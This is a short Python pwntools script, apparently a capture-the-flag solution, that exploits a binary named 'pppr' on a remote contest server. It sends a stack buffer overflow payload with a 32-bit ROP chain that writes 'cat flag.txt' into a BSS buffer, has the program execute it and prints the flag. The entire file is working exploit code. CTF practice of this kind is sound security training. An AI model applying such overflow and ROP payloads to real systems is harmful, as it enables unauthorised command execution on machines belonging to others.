from pwn import *

r = remote("pppr.sstf.site" ,1337)
#r = process("./pppr")
e = ELF("./pppr")
exploit = b"A" * 12 + p32(e.sym.r) + p32(e.sym.main) + p32(e.sym.buf_in_bss) + p32(0xd) + p32(0x0)
r.sendline(exploit)
r.sendline(b"cat flag.txt")
exploit = b"A" * 12 + p32(e.sym.x) + p32(0x0) + p32(e.sym.buf_in_bss)
r.sendline(exploit)
flag = str(r.recvuntil(b"}"))
log.info(f"[FLAG] {flag[2:len(flag)-1]}")
r.close()
